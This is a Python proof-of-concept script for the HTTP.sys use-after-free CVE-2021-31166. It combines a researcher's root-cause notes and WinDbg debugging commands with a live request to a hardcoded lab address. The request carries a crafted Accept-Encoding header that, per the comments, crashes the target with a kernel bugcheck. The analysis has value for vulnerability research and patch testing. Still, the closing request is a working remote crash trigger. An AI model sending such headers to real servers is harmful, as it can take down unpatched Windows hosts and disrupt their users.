#!/usr/bin/env python3

import requests
import argparse


"""
https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021-31166-a-wormable-code-execution-bug-in-httpsys

The HTTP!UlpParseAcceptEncoding routine walks the Field-Value
string by invoking HTTP! UlpParseContentCoding. 

UlpParseAcceptEncoding:
    maintains circular doubly linked list of unknown content-codings
    initializes the root node of the unknown content-codings on the stack
     tail head node
     |    |     |
  *<-()<->()<->()->*

    processes the entire string "aa, bb, cc, etc,"
    nodes are allocated for unknown content-codings in the paged memory pool

    allocated nodes are freed in all but one case immediately by
    UlFreeUnknownCodingList using the ORIGINAL ROOT NODE (the one on the stack) 

    after parsing all content-codings specified, if there are additional nodes
    in the unknown content-codings list, the nodes are unlinked from the root node
    and relinked to another root node in an internal structure (Request).
    The original root nodes next and previous links aren't reset

    IS: 
        request->root:
            *<-(old_prev)<->(new_root)<->(old_next)->*
        original root:
            *<-(old_prev)<->(root)<->(old_next)->*
    SHOULD BE: 
        request->root:
            *<-(old_prev)<->(root)<->(old_next)->*
        original root:
            (root)<->(root)<->(root)
    
    
    a content-coding string containing just "," will throw error 
    0x0c0000225. The unknown content-coding list is migrated to
    the request struct before the error is handled.
    The entry into UlFreeUnknownCodingList is where the first free,
    and the use after free, occur
    
    UlFreeUnknownCodingList:
        frees nodes in the order they were added to the list (head->next->...tail)
        starts with the first non-root node, so head->next
        
        This function is called on the original root, which has broken next and prev
        pointers
                        (request->root)
                                 /|\ 
                                  |
                                 \|/  
        *<-(old_prev)<->(root)->(old_next)->*
                                    /|\ 
                                     | 
                                    freeing

        HTTP!UlFreeUnknownCodingList unlinks this node from the internal structure root
        node instead of the passed in the original root node.
        
                       (request->root)
  
        *<-(old_prev)<->(root)->(old_next)->* 
                                    /|\ 
                                     | 
                                    freeing

    The node is free, integrity checks are performed, but they fail.
    Previous of old_next points to request->root. old_next is up for freeing
    again. BEFORE the free, sanity checking sees that the previous node
    is the original root, but the original root's next is old_next_next
    (after unlinking old_next)/ old_next is used (after freed) for sanity checks,
    they fail, and the kernel panics

    Can you generate this error with a list of length 1? root would point to root
    after the free?

    Can't generate error with list of length 1

    After looking at this, I don't see how this could be exploited.
    Even locally, if you could somehow control the memory of the free node
    (very fast process, small window to get the memory reassigned), you'd
    also have to have an info leak (for remote) to pass the sanity check during
    unlinking. All in all this does not seem like a good bug to exploit,
    but I realize that there may be things I don't know. Excited to see if
    someone pushes this further.
      
"""
"""
https://github.com/0vercl0k/CVE-2021-31166
The bug itself happens in http!UlpParseContentCoding where the function has
a local LIST_ENTRY and appends item to it. When it's done, it moves it into
the Request structure; but it doesn't NULL out the local list. The issue
with that is that an attacker can trigger a code-path that frees
every entries of the local list leaving them dangling in the Request object.

"""
"""
parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
parser.add_argument('--target', required = True)
args = parser.parse_args()
"""

"""
jeff bug notes

free aparently in UlpParseContentCoding

crash occurs in 2nd call to UlFreeUnknownCodingList in 
UlpParseAcceptEncoding.

bug is use after free, it seems that a double free
on the same LIST_ENTRY causes this bugcheck/crash

only 4 calls to UlFreeUnknownCodingList
only one of them hits on the crash, so use after free is coming from a call directly
to ExFreePoolWithTag

to find first free, break on every free and check if buffer contains our header content

bp nt!ExFreePoolWithTag ".if (@retreg == dodgyVal) {db rcx;} .else {gc}"
^ this method did not work, I ended up trying the conditional: 
.if (@rcx != 0) { as /ma ${/v:EventName} @rcx } .else { ad /q ${/v:EventName} }
.if ($spat(@"${EventName}", "AAAA*") == 0)  { gc } .else { .echo EventName }

now turning on heap asan and seeing where that gets me
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /k +hpa +ust

UlpParseContentCoding(*char headerText, 13, null, null, )
pointer to string of header text


mov     r10, qword ptr [HTTP!_imp_ExFreePoolWithTag (fffff803`28535c38)] ds:002b:fffff803`28535c38={nt!ExFreePool (fffff803`229b1010)}

bp HTTP!UlpHandleRequest
bp nt!ExFreeHeapPool "$$<C:\\Users\\jeff\\Desktop\\ghidra-cmd.txt"
bp HTTP!UlFreeUnknownCodingList+0x50 "$$<C:\\Users\\jeff\\Desktop\\ghidra-cmd.txt"
.if (@rcx != 0) { as /ma ${/v:EventName} @rcx } .else { ad /q ${/v:EventName} }
.if ($spat(@"${EventName}", "AAAA*") == 0)  { gc } .else { .echo EventName }

bug actually is triggered on first free (AAAA)

"""
"""
psuedocode for UlpParseContentCoding


splitHeaderByCommas
"""

r = requests.get(f'http://192.168.184.129/', headers = {
    # returns 400
    #'Accept-Encoding': 'gzip, identity, ,',
    # crashes
    #'Accept-Encoding': 'gzip, identity, AAAA, ,',
    'Accept-Encoding': 'gzip, a, identity, ,',
})
print(r)
